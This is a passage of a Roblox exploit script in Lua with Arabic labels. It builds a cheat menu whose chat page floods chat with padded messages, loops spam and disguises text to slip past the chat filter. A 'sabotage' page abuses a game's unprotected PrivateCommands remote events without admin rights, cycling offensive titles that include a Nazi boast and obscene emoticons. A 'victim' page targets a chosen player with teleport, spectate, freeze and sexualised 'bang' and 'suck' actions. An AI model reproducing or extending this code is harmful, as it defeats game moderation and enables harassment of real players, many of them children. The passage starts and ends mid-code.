    {Text = "رقصت 1", Position = UDim2.new(0.1, 0, 0.13, 0), AnimationId = "rbxassetid://17381912171"},
    {Text = "رقصت 2", Position = UDim2.new(0.1, 0, 0.33, 0), AnimationId = "rbxassetid://18396187889"},
    {Text = "رقصت 3", Position = UDim2.new(0.1, 0, 0.53, 0), AnimationId = "rbxassetid://80909423274891", Duration = 2} -- إضافة مدة للرقصة الثالثة
}

for i, buttonInfo in ipairs(danceButtons) do
    local danceButton = Instance.new("TextButton")
    danceButton.Size = UDim2.new(0.8, 0, 0.1, 0)
    danceButton.Position = buttonInfo.Position
    danceButton.Text = buttonInfo.Text
    danceButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
    danceButton.TextColor3 = Color3.new(0, 0, 0)
    danceButton.Font = Enum.Font.SourceSansBold
    danceButton.TextSize = 18
    danceButton.Parent = dancesPage

    -- زوايا الأزرار
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0.2, 0)
    buttonCorner.Parent = danceButton

    -- حدث النقر على الزر
    if buttonInfo.AnimationId then
        danceButton.MouseButton1Click:Connect(function()
            -- احصل على الشخصية
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()

            -- إعداد الحركة (Animation)
            local animation = Instance.new("Animation")
            animation.AnimationId = buttonInfo.AnimationId

            -- تحميل الحركة وتشغيلها
            local humanoid = character:WaitForChild("Humanoid")
            local animationTrack = humanoid:LoadAnimation(animation)

            -- تشغيل الحركة
            animationTrack:Play()

            -- إذا كانت الرقصة الثالثة، أوقفها بعد المدة المحددة
            if buttonInfo.Duration then
                wait(buttonInfo.Duration) -- انتظر المدة المحددة
                animationTrack:Stop() -- أوقف الرقصة
            end
        end)
    end
end

-- إضافة صفحة الرقصات إلى جدول الصفحات
pages["رقصات"] = dancesPage



-- صفحة الشات
local chatPage = Instance.new("Frame")
chatPage.Size = UDim2.new(1, 0, 1, 0)
chatPage.Position = UDim2.new(0, 0, 0, 0)
chatPage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
chatPage.Visible = false
chatPage.Parent = rightFrame

-- إنشاء إطار المحتوى
local contentFrame = Instance.new("Frame")
contentFrame.Size = UDim2.new(1, 0, 1, 0)
contentFrame.Position = UDim2.new(0, 0, 0, 0)
contentFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- خلفية غامقة
contentFrame.Parent = chatPage

-- إضافة حواف مستديرة لإطار المحتوى
local contentCorner = Instance.new("UICorner")
contentCorner.CornerRadius = UDim.new(0.05, 0)
contentCorner.Parent = contentFrame

-- مربع النص لإدخال الرسالة
local inputBox = Instance.new("TextBox")
inputBox.Size = UDim2.new(0.8, 0, 0.2, 0)
inputBox.Position = UDim2.new(0.1, 0, 0.1, 0)
inputBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- خلفية رمادية
inputBox.Text = "اكتب رسالتك هنا..."
inputBox.TextColor3 = Color3.new(1, 1, 1) -- لون النص أبيض
inputBox.Font = Enum.Font.SourceSansBold
inputBox.TextSize = 18
inputBox.ClearTextOnFocus = true
inputBox.Parent = contentFrame

local noteLabel = Instance.new("TextLabel")
noteLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
noteLabel.Position = UDim2.new(0.1, 0, 0.001, 0)
noteLabel.BackgroundTransparency = 1
noteLabel.Text = "اقرا التعليمات قبل الستخدام ارسال رساله طويله"
noteLabel.TextColor3 = Color3.new(0, 0, 0)
noteLabel.Font = Enum.Font.SourceSans
noteLabel.TextSize = 16
noteLabel.Parent = contentFrame

-- إضافة حواف مستديرة لمربع النص
local inputCorner = Instance.new("UICorner")
inputCorner.CornerRadius = UDim.new(0.1, 0)
inputCorner.Parent = inputBox

-- إطار يحتوي على الأزرار في نفس السطر
local buttonFrame = Instance.new("Frame")
buttonFrame.Size = UDim2.new(0.8, 0, 0.1, 0)
buttonFrame.Position = UDim2.new(0.1, 0, 0.3, 0)
buttonFrame.BackgroundTransparency = 1 -- إطار شفاف
buttonFrame.Parent = contentFrame

-- زر الإرسال
local sendButton = Instance.new("TextButton")
sendButton.Size = UDim2.new(0.38, 0, 1, 0) -- تقليل الحجم لاستيعاب الزر الجديد
sendButton.Position = UDim2.new(0, 0, 0, 0)
sendButton.Text = "ارسال رساله طويله"
sendButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- لون ذهبي
sendButton.TextColor3 = Color3.new(0, 0, 0) -- لون النص أسود
sendButton.Font = Enum.Font.SourceSansBold
sendButton.TextSize = 18
sendButton.Parent = buttonFrame

-- إضافة حواف مستديرة لزر الإرسال
local sendButtonCorner = Instance.new("UICorner")
sendButtonCorner.CornerRadius = UDim.new(0.1, 0)
sendButtonCorner.Parent = sendButton

-- زر الفلترة
local filterButton = Instance.new("TextButton")
filterButton.Size = UDim2.new(0.24, 0, 1, 0) -- حجم أصغر
filterButton.Position = UDim2.new(0.39, 0, 0, 0) -- بين الإرسال والسبام
filterButton.Text = "فلترة"
filterButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- لون ذهبي
filterButton.TextColor3 = Color3.new(0, 0, 0) -- لون النص أسود
filterButton.Font = Enum.Font.SourceSansBold
filterButton.TextSize = 18
filterButton.Parent = buttonFrame

-- إضافة حواف مستديرة لزر الفلترة
local filterButtonCorner = Instance.new("UICorner")
filterButtonCorner.CornerRadius = UDim.new(0.1, 0)
filterButtonCorner.Parent = filterButton

-- زر السبام
local spamButton = Instance.new("TextButton")
spamButton.Size = UDim2.new(0.36, 0, 1, 0) -- تقليل الحجم لاستيعاب زر الفلترة
spamButton.Position = UDim2.new(0.64, 0, 0, 0) -- بجانب زر الفلترة
spamButton.Text = "سبام"
spamButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- لون ذهبي
spamButton.TextColor3 = Color3.new(0, 0, 0) -- لون النص أسود
spamButton.Font = Enum.Font.SourceSansBold
spamButton.TextSize = 18
spamButton.Parent = buttonFrame

-- إضافة حواف مستديرة لزر السبام
local spamButtonCorner = Instance.new("UICorner")
spamButtonCorner.CornerRadius = UDim.new(0.1, 0)
spamButtonCorner.Parent = spamButton

-- زر إرسال ما يشفر
local encryptButton = Instance.new("TextButton")
encryptButton.Size = UDim2.new(1, 1, 1 , 1) -- نفس حجم زر الإرسال
encryptButton.Position = UDim2.new(0 ,1, 1, 1) -- بجانب زر السبام
encryptButton.Text = "80% إرسال ما يشفر"
encryptButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- لون ذهبي
encryptButton.TextColor3 = Color3.new(0, 0, 0) -- لون النص أسود
encryptButton.Font = Enum.Font.SourceSansBold
encryptButton.TextSize = 18
encryptButton.Parent = buttonFrame

-- إضافة حواف مستديرة لزر إرسال ما يشفر
local encryptButtonCorner = Instance.new("UICorner")
encryptButtonCorner.CornerRadius = UDim.new(0.1, 0)
encryptButtonCorner.Parent = encryptButton

-- خدمة الدردشة
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- دالة إرسال الرسائل
local function chatMessage(str)
    str = tostring(str)
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        TextChatService.TextChannels.RBXGeneral:SendAsync(str)
    else
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
    end
end

-- دالة إرسال الرسالة الطويلة
local function sendLongMessage(customMessage)
    local blob = "\u{000D}"
    local longMessage = "㉿_1st_㉿ℭ§¹" .. blob
    for i = 1, 70 do
        longMessage = longMessage .. "" .. blob
    end
    longMessage = longMessage .. customMessage
    chatMessage(longMessage)
end

-- وظيفة زر الإرسال
sendButton.MouseButton1Click:Connect(function()
    sendLongMessage(inputBox.Text)
end)

-- وظيفة زر الفلترة
filterButton.MouseButton1Click:Connect(function()
    chatMessage("/E ABC")
end)

-- وظيفة زر السبام
local isSpamming = false
local spamCoroutine
spamButton.MouseButton1Click:Connect(function()
    if isSpamming then
        isSpamming = false
        spamButton.Text = "سبام"
        if spamCoroutine then
            coroutine.close(spamCoroutine)
        end
    else
        isSpamming = true
        spamButton.Text = "إيقاف"
        spamCoroutine = coroutine.create(function()
            while isSpamming do
                sendLongMessage("1st")
                wait(3.5)
            end
        end)
        coroutine.resume(spamCoroutine)
    end
end)

-- وظيفة زر إرسال ما يشفر
local function ApplyCustomFormat(message)
    return "¹§ℭ㉿s㉿x㉿__" .. message:gsub("%s", "_") .. "__㉿s㉿x㉿ℭ§¹"
end

local function SafeSend(message)
    local success, err = pcall(function()
        if ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") then
            ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
        else
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        end
    end)
    return success, err
end

encryptButton.MouseButton1Click:Connect(function()
    local rawMessage = inputBox.Text:gsub("^%s*(.-)%s*$", "%1")
    if rawMessage == "" then return end
    local formatted = ApplyCustomFormat(rawMessage)
    
    task.spawn(function()
        -- إرسال الرسالة الفعلية أولاً
        local success, err = SafeSend(formatted)
        if success then
            inputBox.Text = ""
            -- بعد انتظار قصير، إرسال "/e ABC"
            task.wait(0)
            SafeSend("/e ABC")
        else
            inputBox.Text = rawMessage
        end
    end)
end)

pages["الشات"] = chatPage

-- إنشاء الإطار الرئيسي مع إمكانية التمرير
local sabotagePage = Instance.new("ScrollingFrame")
sabotagePage.Size = UDim2.new(1, 0, 1, 0)
sabotagePage.Position = UDim2.new(0, 0, 0, 0)
sabotagePage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
sabotagePage.Visible = false
sabotagePage.CanvasSize = UDim2.new(0, 0, 2, 0) -- زيادة المساحة العمودية للتمرير
sabotagePage.ScrollBarThickness = 10
sabotagePage.Parent = rightFrame

-- إضافة حواف مستديرة للإطار
local contentCorner = Instance.new("UICorner")
contentCorner.CornerRadius = UDim.new(0.05, 0)
contentCorner.Parent = sabotagePage

-- جدول الألوان والكلمات لزر "كل شيء"
local allColors = {
    Color3.new(0.1, 0.1, 0.1), -- أسود داكن
    Color3.new(0.8, 0.7, 0.2), -- ذهبي
    Color3.new(0.75, 0.75, 0.75), -- فضي
    Color3.new(1, 0.27, 0), -- برتقالي ناري
    Color3.new(0.47, 0.53, 0.6), -- رمادي مائل للأزرق
    Color3.new(0.5, 0, 0), -- أحمر داكن
    Color3.new(0, 0.3, 0), -- أخضر داكن
    Color3.new(0, 0.5, 1) -- أزرق نيوي
}

local allWords = {
    "1st",
    "1st"
}
-- متغير لتتبع حالة زر "كل شيء"
local isAllRunning = false

-- دالة لتغيير الألوان والكلمات
local function changeAllColorsAndWords()
    local colorIndex = 1
    local wordIndex = 1
    while isAllRunning do
        local selectedColor = allColors[colorIndex]
        local selectedWord = allWords[wordIndex]
        
        local args = {
            [1] = selectedWord,
            [2] = selectedColor
        }
        game:GetService("ReplicatedStorage").PrivateCommands.Title:FireServer(unpack(args))
        
        colorIndex = (colorIndex % #allColors) + 1
        wordIndex = (wordIndex % #allWords) + 1
        
        wait(0) -- تغيير اللون والكلمة كل ثانية
    end
end

-- إضافة ملاحظة
local noteLabel = Instance.new("TextLabel")
noteLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
noteLabel.Position = UDim2.new(0.1, 0, 0.26, 0)
noteLabel.BackgroundTransparency = 1
noteLabel.Text = "سبام اسماء "
noteLabel.TextColor3 = Color3.new(1, 1, 1)
noteLabel.Font = Enum.Font.SourceSans
noteLabel.TextSize = 16
noteLabel.Parent = sabotagePage

-- زر طويل "كل شيء"
local allButton = Instance.new("TextButton")
allButton.Size = UDim2.new(0.8, 0, 0.06, 0)
allButton.Position = UDim2.new(0.1, 0, 0.42, 0)
allButton.Text = "1st"
allButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
allButton.TextColor3 = Color3.new(0, 0, 0)
allButton.Font = Enum.Font.SourceSansBold
allButton.TextSize = 18
allButton.Parent = sabotagePage

local allCorner = Instance.new("UICorner")
allCorner.CornerRadius = UDim.new(0.1, 0)
allCorner.Parent = allButton

allButton.MouseButton1Click:Connect(function()
    isAllRunning = not isAllRunning
    allButton.Text = isAllRunning and "إيقاف " or "1st "
    if isAllRunning then
        changeAllColorsAndWords()
    end
end)

-- جدول الألوان والكلمات للزر الأول (أسلحة)
local weaponColors = {
    Color3.new(0.1, 0.1, 0.1), -- أسود داكن
    Color3.new(0.8, 0.7, 0.2), -- ذهبي
    Color3.new(0.75, 0.75, 0.75), -- فضي
    Color3.new(1, 0.27, 0), -- برتقالي ناري
    Color3.new(0.47, 0.53, 0.6), -- رمادي مائل للأزرق
    Color3.new(0.5, 0, 0), -- أحمر داكن
    Color3.new(0, 0.3, 0), -- أخضر داكن
    Color3.new(0, 0.5, 1) -- أزرق نيوي
}

local weaponWords = {
    "︻┻┳══━一∵∵",
    "︻デ═一∵.",
    "︻┳═一∵∵",
    "︻┻┳═一∵",
    "︻デ═一∶∵",
    "``∵∵一┳═┻︻",
    "︻┻┳━ ·`."
}

-- جدول الألوان والكلمات للزر الثاني (إصبع)
local fingerColors = {
    Color3.new(0.1, 0.1, 0.1), -- أسود داكن
    Color3.new(0.8, 0.7, 0.2), -- ذهبي
    Color3.new(0.75, 0.75, 0.75), -- فضي
    Color3.new(1, 0.27, 0), -- برتقالي ناري
    Color3.new(0.47, 0.53, 0.6), -- رمادي مائل للأزرق
    Color3.new(0.5, 0, 0), -- أحمر داكن
    Color3.new(0, 0.3, 0), -- أخضر داكن
    Color3.new(0, 0.5, 1) -- أزرق نيوي
}

local fingerWords = {
    "╭∩╮_( ︶︿︶)_╭∩╮",
    "凸(｀0´)凸",
    "凸(｀⌒´メ)凸",
    "凸(^▼ｪ▼ﾒ^)",
    "╭∩╮(⋋‿⋌)ᕗ)",
    "╭∩╮ʕ•ᴥ•ʔ╭∩╮",
    "（︶︿︶_╭∩╮",
    "╭∩╮ʕ•ᴥ•ʔ╭∩╮_╭∩╮(ʕ•ᴥ•ʔ)╭∩╮",
    "╭∩╮_☯_☯_╭∩╮",
    "╭∩╮(-_-)╭∩╮"
}

-- متغيرات لتتبع حالة التشغيل
local isWeaponRunning = false
local isFingerRunning = false

-- دالة عامة لتغيير الألوان والكلمات
local function changeColorsAndWords(colors, words, interval, isRunningCallback)
    local colorIndex = 1
    local wordIndex = 1
    
    while isRunningCallback() do
        local selectedColor = colors[colorIndex]
        local selectedWord = words[wordIndex]
        
        local args = {
            [1] = selectedWord,
            [2] = selectedColor
        }
        game:GetService("ReplicatedStorage").PrivateCommands.Title:FireServer(unpack(args))
        
        colorIndex = (colorIndex % #colors) + 1
        wordIndex = (wordIndex % #words) + 1
        
        wait(interval)
    end
end

-- زر أسلحة
local weaponButton = Instance.new("TextButton")
weaponButton.Size = UDim2.new(0.25, 0, 0.06, 0)
weaponButton.Position = UDim2.new(0.1, 0, 0.35, 0)
weaponButton.Text = "أسلحة"
weaponButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
weaponButton.TextColor3 = Color3.new(0, 0, 0)
weaponButton.Font = Enum.Font.SourceSansBold
weaponButton.TextSize = 18
weaponButton.Parent = sabotagePage

weaponButton.MouseButton1Click:Connect(function()
    isWeaponRunning = not isWeaponRunning
    weaponButton.Text = isWeaponRunning and "إيقاف أسلحة" or "أسلحة"
    if isWeaponRunning then
        changeColorsAndWords(weaponColors, weaponWords, 1, function() return isWeaponRunning end)
    end
end)

-- زر إصبع
local fingerButton = Instance.new("TextButton")
fingerButton.Size = UDim2.new(0.25, 0, 0.06, 0)
fingerButton.Position = UDim2.new(0.377, 0, 0.35, 0)
fingerButton.Text = "إصبع"
fingerButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
fingerButton.TextColor3 = Color3.new(0, 0, 0)
fingerButton.Font = Enum.Font.SourceSansBold
fingerButton.TextSize = 18
fingerButton.Parent = sabotagePage

fingerButton.MouseButton1Click:Connect(function()
    isFingerRunning = not isFingerRunning
    fingerButton.Text = isFingerRunning and "إيقاف إصبع" or "إصبع"
    if isFingerRunning then
        changeColorsAndWords(fingerColors, fingerWords, 1, function() return isFingerRunning end)
    end
end)

-- زر تحديث 0.4
local updateButton = Instance.new("TextButton")
updateButton.Size = UDim2.new(0.25, 0, 0.06, 0)
updateButton.Position = UDim2.new(0.65, 0, 0.35, 0)
updateButton.Text = "اقتراحاتكم"
updateButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
updateButton.TextColor3 = Color3.new(0, 0, 0)
updateButton.Font = Enum.Font.SourceSansBold
updateButton.TextSize = 18
updateButton.Parent = sabotagePage

-- جدول الأسماء المطلوبة لزر تحديث 0.4
local updateNames = {
    "لا مكان للضعفاء بيننا",
    "انا الساطي", 
    "انا 1st",
    "㉿ℭانا_النازي",
    "انا عم النسيخه",
    "ساحة المعركة تعرف أبطالها",
    "من يواجهنا، يكتب نهايته",
    "㉿ℭحين أقف، العالم يُصغي",
    "أنت كالصفر... لا قيمة لك إلا بجانب غيرك",
	"لا تضيع وقتي، فحتى الساعة ترفض عدَّ دقائقك"   
}

-- جدول الألوان لزر تحديث 0.4
local updateColors = {
    Color3.new(1, 0, 0), -- أحمر
    Color3.new(0, 1, 0), -- أخضر
    Color3.new(0, 0, 1), -- أزرق
    Color3.new(1, 1, 0), -- أصفر
    Color3.new(1, 0, 1), -- أرجواني
    Color3.new(0, 1, 1), -- فيروزي
    Color3.new(1, 0.5, 0), -- برتقالي
    Color3.new(0.5, 0, 0.5) -- بنفسجي غامق
}

-- متغير لتتبع حالة زر تحديث 0.4
local isUpdateRunning = false

-- دالة لتغيير الأسماء والألوان بسرعة
local function changeUpdateNamesAndColors()
    local nameIndex = 1
    local colorIndex = 1
    while isUpdateRunning do
        local selectedName = updateNames[nameIndex]
        local selectedColor = updateColors[colorIndex]
        
        local args = {
            [1] = selectedName,
            [2] = selectedColor
        }
        game:GetService("ReplicatedStorage").PrivateCommands.Title:FireServer(unpack(args))
        
        nameIndex = (nameIndex % #updateNames) + 1
        colorIndex = (colorIndex % #updateColors) + 1
        
        wait(0.1) -- تغيير الاسم واللون كل 0.5 ثانية
    end
end

updateButton.MouseButton1Click:Connect(function()
    isUpdateRunning = not isUpdateRunning
    updateButton.Text = isUpdateRunning and "إيقاف" or "تشغيل"
    if isUpdateRunning then
        changeUpdateNamesAndColors()
    end
end)


-- زر تغيير السكن
local changeSkinButton = Instance.new("TextButton")
changeSkinButton.Size = UDim2.new(0.8, 0, 0.06, 0)
changeSkinButton.Position = UDim2.new(0.1, 0, 0.07, 0)
changeSkinButton.Text = "تغيير السكن سريع"
changeSkinButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
changeSkinButton.TextColor3 = Color3.new(0, 0, 0)
changeSkinButton.Font = Enum.Font.SourceSansBold
changeSkinButton.TextSize = 18
changeSkinButton.Parent = sabotagePage

-- إضافة حواف مستديرة لزر تغيير السكن
local changeSkinCorner = Instance.new("UICorner")
changeSkinCorner.CornerRadius = UDim.new(0.1, 0)
changeSkinCorner.Parent = changeSkinButton

-- زر تغيير الحجم
local changeSizeButton = Instance.new("TextButton")
changeSizeButton.Size = UDim2.new(0.8, 0, 0.06, 0)
changeSizeButton.Position = UDim2.new(0.1, 0, 0.15, 0)
changeSizeButton.Text = "تغيير الحجم سريع"
changeSizeButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
changeSizeButton.TextColor3 = Color3.new(0, 0, 0)
changeSizeButton.Font = Enum.Font.SourceSansBold
changeSizeButton.TextSize = 18
changeSizeButton.Parent = sabotagePage

-- إضافة حواف مستديرة لزر تغيير الحجم
local changeSizeCorner = Instance.new("UICorner")
changeSizeCorner.CornerRadius = UDim.new(0.1, 0)
changeSizeCorner.Parent = changeSizeButton

-- زر re
local reButton = Instance.new("TextButton")
reButton.Size = UDim2.new(0.8, 0, 0.06, 0)
reButton.Position = UDim2.new(0.1, 0, 0.23, 0)
reButton.Text = "re(free)"
reButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
reButton.TextColor3 = Color3.new(0, 0, 0)
reButton.Font = Enum.Font.SourceSansBold
reButton.TextSize = 18
reButton.Parent = sabotagePage

-- إضافة حواف مستديرة لزر re
local reCorner = Instance.new("UICorner")
reCorner.CornerRadius = UDim.new(0.1, 0)
reCorner.Parent = reButton

-- إضافة ملاحظة
local noteLabel = Instance.new("TextLabel")
noteLabel.Size = UDim2.new(0.8, 0, 0.05, 0)
noteLabel.Position = UDim2.new(0.1, 0, 0.001, 0)
noteLabel.BackgroundTransparency = 1
noteLabel.Text = "جميع هذه القائمة ليست بحاجة للإدمن"
noteLabel.TextColor3 = Color3.new(1, 1, 1)
noteLabel.Font = Enum.Font.SourceSans
noteLabel.TextSize = 16
noteLabel.Parent = sabotagePage

-- القوائم الكاملة للسكن والحجم
local skinArgsList = {
    {2449045526}, {1628552658}, {4433464560}, {59268909}, {691071511},
    {109018734}, {2739393225}, {6043597495}, {3762661791}, {352895273},
    {232410155}, {5554295694}, {2247208387}, {1688667295}, {1481558084},
    {1566311634}, {7570856623}, {1378020902}, {1180964108}, {4833944032},
    {64032380}, {7010193878},  {7224715700}
}

local sizeArgsList = {
    {0.5}, {0.6}, {0.7}, {0.8}, {0.9}, {1}, {1.1}, {1.2}, {1.3}, {1.4},
    {1.5}, {1.6}, {1.7}, {1.8}, {1.9}, {2.0}, {1.9}, {1.8}, {1.7}, {1.6},
    {1.5}, {1.4}, {1.3}, {1.2}, {1.1}, {0.9}, {0.8}, {0.7}, {0.6}, {0.5}
}

-- التحكم في التشغيل
local isRunningSkin = false
local isRunningSize = false

-- دالة لإرسال الطلبات
local function sendRequest(args, serviceName)
    game:GetService("ReplicatedStorage").PrivateCommands[serviceName]:FireServer(unpack(args))
end

-- دالة تغيير السكن
local function toggleSkin()
    isRunningSkin = not isRunningSkin
    changeSkinButton.Text = isRunningSkin and "إيقاف تغيير السكن سريع" or "تغيير السكن سريع"
    if isRunningSkin then
        coroutine.wrap(function()
            while isRunningSkin do
                for _, args in ipairs(skinArgsList) do
                    if not isRunningSkin then break end
                    sendRequest(args, "Char")
                    task.wait(0.2)
                end
                task.wait(0.8)
            end
        end)()
    end
end

-- دالة تغيير الحجم
local function toggleSize()
    isRunningSize = not isRunningSize
    changeSizeButton.Text = isRunningSize and "إيقاف تغيير الحجم سريع" or "تغيير الحجم سريع"
    if isRunningSize then
        coroutine.wrap(function()
            while isRunningSize do
                for _, args in ipairs(sizeArgsList) do
                    if not isRunningSize then break end
                    sendRequest(args, "Size")
                    task.wait(0.04)
                end
            end
        end)()
    end
end

-- دالة re
local function activateRe()
    sendRequest({4592243049}, "Char")
    sendRequest({"No"}, "Char")
end

-- توصيل الأزرار بوظائفها
changeSkinButton.MouseButton1Click:Connect(toggleSkin)
changeSizeButton.MouseButton1Click:Connect(toggleSize)
reButton.MouseButton1Click:Connect(activateRe)



pages["تخريب"] = sabotagePage

-- صفحة الضحية
local victimPage = Instance.new("Frame")
victimPage.Size = UDim2.new(1, 0, 1, 0)
victimPage.Position = UDim2.new(0, 0, 0, 0)
victimPage.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
victimPage.Visible = false
victimPage.Parent = rightFrame

-- إضافة ScrollingFrame لاحتواء العناصر مع إمكانية التمرير
local scrollFrame = Instance.new("ScrollingFrame")
scrollFrame.Size = UDim2.new(1, 0, 1, 0)
scrollFrame.Position = UDim2.new(0, 0, 0, 0)
scrollFrame.BackgroundTransparency = 1
scrollFrame.ScrollBarThickness = 6
scrollFrame.CanvasSize = UDim2.new(0, 0, 1.5, 0) -- زيادة حجم القماش للتمرير
scrollFrame.Parent = victimPage

-- مربع النص لإدخال اسم اللاعب
local inputBox = Instance.new("TextBox")
inputBox.Size = UDim2.new(0.5, 0, 0.1, 0)
inputBox.Position = UDim2.new(0.01, 0, 0.01, 0)
inputBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
inputBox.Text = "اكتب أول 3 الأحرف"
inputBox.TextColor3 = Color3.new(1, 1, 1)
inputBox.Font = Enum.Font.SourceSansBold
inputBox.TextSize = 14
inputBox.ClearTextOnFocus = true
inputBox.Parent = scrollFrame

-- إضافة صورة اللاعب
local profilePicture = Instance.new("ImageLabel")
profilePicture.Size = UDim2.new(0, 110, 0, 110)
profilePicture.Position = UDim2.new(0.66, 0, 0.001, 0)
profilePicture.BackgroundColor3 = Color3.new(0, 0, 0) -- صورة سوداء افتراضية
profilePicture.BorderSizePixel = 0
profilePicture.Parent = scrollFrame

-- جعل الصورة دائرية
local profileCorner = Instance.new("UICorner")
profileCorner.CornerRadius = UDim.new(1, 0)
profileCorner.Parent = profilePicture

-- منطقة عرض معلومات اللاعب
local infoFrame = Instance.new("Frame")
infoFrame.Size = UDim2.new(1.21, 1, 1, 0)
infoFrame.Position = UDim2.new(0.2, 0, 0.28, 0)
infoFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
infoFrame.BackgroundTransparency = 1
infoFrame.Parent = scrollFrame

local infoText = Instance.new("TextLabel")
infoText.Size = UDim2.new(1, 0, 1, 0)
infoText.BackgroundTransparency = 1
infoText.TextColor3 = Color3.new(1, 1, 1)
infoText.TextSize = 14
infoText.Font = Enum.Font.SourceSansBold
infoText.TextWrapped = true
infoText.TextYAlignment = Enum.TextYAlignment.Top
infoText.Text = "معلومات:"
infoText.Parent = infoFrame

-- زر لنقل الأغراض
local transferButton = Instance.new("TextButton")
transferButton.Size = UDim2.new(0.3, 0, 0.07, 0)
transferButton.Position = UDim2.new(0.01, 0, 0.13, 0)
transferButton.Text = "نقل الأغراض"
transferButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
transferButton.TextColor3 = Color3.new(0, 0, 0)
transferButton.Font = Enum.Font.SourceSansBold
transferButton.TextSize = 18
transferButton.Parent = scrollFrame

local danceToggleButton = Instance.new("TextButton")
danceToggleButton.Name = "DanceToggleButton"
danceToggleButton.Size = UDim2.new(0.3, 0, 0.07, 0)
danceToggleButton.Position = UDim2.new(0.32, 0, 0.13, 0) -- نفس موقع الزر الأصلي
danceToggleButton.Text = "ترقيص"
danceToggleButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- أصفر
danceToggleButton.TextColor3 = Color3.new(0, 0, 0)
danceToggleButton.Font = Enum.Font.SourceSansBold
danceToggleButton.TextSize = 18
danceToggleButton.Parent = scrollFrame
-- زر بانج
local bangButton = Instance.new("TextButton")
bangButton.Size = UDim2.new(0.3, 0, 0.07, 0)
bangButton.Position = UDim2.new(0.01, 0, 0.22, 0)
bangButton.Text = "بانج"
bangButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
bangButton.TextColor3 = Color3.new(0, 0, 0)
bangButton.Font = Enum.Font.SourceSansBold
bangButton.TextSize = 18
bangButton.Parent = scrollFrame

-- زر مص
local suckButton = Instance.new("TextButton")
suckButton.Size = UDim2.new(0.3, 0, 0.07, 0)
suckButton.Position = UDim2.new(0.32, 0, 0.22, 0) -- بجانب زر بانج
suckButton.Text = "مص"
suckButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- لون أصفر
suckButton.TextColor3 = Color3.new(0, 0, 0)
suckButton.Font = Enum.Font.SourceSansBold
suckButton.TextSize = 18
suckButton.Parent = scrollFrame

-- زر الانتقال
local teleportButton = Instance.new("TextButton")
teleportButton.Size = UDim2.new(0.3, 0, 0.07, 0)
teleportButton.Position = UDim2.new(0.01, 0, 0.31, 0) -- تحت زر نقل الأغراض
teleportButton.Text = "انتقال"
teleportButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) 
teleportButton.TextColor3 = Color3.new(0, 0, 0)
teleportButton.Font = Enum.Font.SourceSansBold
teleportButton.TextSize = 18
teleportButton.Parent = scrollFrame

-- زر رايته
local spectateButton = Instance.new("TextButton")
spectateButton.Size = UDim2.new(0.3, 0, 0.07, 0)
spectateButton.Position = UDim2.new(0.32, 0, 0.31, 0) -- بجانب زر الانتقال
spectateButton.Text = "رايته"
spectateButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- لون أصفر
spectateButton.TextColor3 = Color3.new(0, 0, 0)
spectateButton.Font = Enum.Font.SourceSansBold
spectateButton.TextSize = 18
spectateButton.Parent = scrollFrame

-- إضافة زر التجميد إلى صفحة الضحية
local freezeButton = Instance.new("TextButton")
freezeButton.Size = UDim2.new(0.3, 0, 0.07, 0)
freezeButton.Position = UDim2.new(0.01, 0, 0.40, 0) -- بجانب زر العمليات المتتابعة
freezeButton.Text = "تجميد (بحاجه لكلبشه)"
freezeButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- لون برتقالي
freezeButton.TextColor3 = Color3.new(0, 0, 0)
freezeButton.Font = Enum.Font.SourceSansBold
freezeButton.TextSize = 14
freezeButton.Parent = scrollFrame

-- إضافة زر الكلبشة إلى صفحة الضحية (بنفس نمط الأزرار السابقة)
local klbshButton = Instance.new("TextButton")
klbshButton.Size = UDim2.new(0.3, 0, 0.07, 0)
klbshButton.Position = UDim2.new(0.32, 0, 0.40, 0) -- نفس موقع زر التجميد السابق
klbshButton.Text = "كلبشه (بحاجه لكلبش)"
klbshButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) -- لون برتقالي مميز
klbshButton.TextColor3 = Color3.new(0, 0, 0)
klbshButton.Font = Enum.Font.SourceSansBold
klbshButton.TextSize = 18
klbshButton.Parent = scrollFrame

-- زر الأمر (فتحوني)
local openCommandButton = Instance.new("TextButton")
openCommandButton.Size = UDim2.new(0.3, 0, 0.07, 0)
openCommandButton.Position = UDim2.new(0.01, 0, 0.76, 0)
openCommandButton.Text = "نسخ (ادمن)"
openCommandButton.BackgroundColor3 = Color3.fromRGB(255, 215, 0) 
openCommandButton.TextColor3 = Color3.new(0, 0, 0)
